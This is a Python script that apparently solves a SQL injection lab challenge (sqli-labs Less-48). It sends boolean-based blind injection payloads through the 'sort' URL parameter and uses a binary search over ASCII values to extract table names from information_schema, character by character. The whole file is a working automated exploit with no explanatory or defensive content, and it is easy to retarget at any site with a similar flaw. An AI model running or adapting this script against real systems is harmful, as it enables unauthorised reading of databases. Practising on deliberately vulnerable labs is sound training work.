#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

def getPayload(indexOfResult, indexOfChar, mid):
	startStr = "3"
	endStr = " --+"
	payload = "select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit " + indexOfResult +", 1), " + indexOfChar + ", 1)) > " + mid
	payload = startStr + payload + endStr
	return payload

def exce(indexOfResult, indexOfChar, mid):
	# change the url according to the challenge
	url = "http://ef31cb282e3288fb4ca0825f42786711.n1.vsgo.cloud:19488/sqlilabs/Less-48/?sort="
	tempurl = url + getPayload(indexOfResult,indexOfChar,mid)
	content = requests.get(tempurl).text
	if "Welcome" in content:
		return True
	else:
		return False

def doubleSearch(indexOfResult, indexOfChar, left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32):
		counter = 0
		for j in range(32):
			counter += 1
			temp = doubleSearch(i, j, 0, 128)
			if ord(temp) == 1:
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: 
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()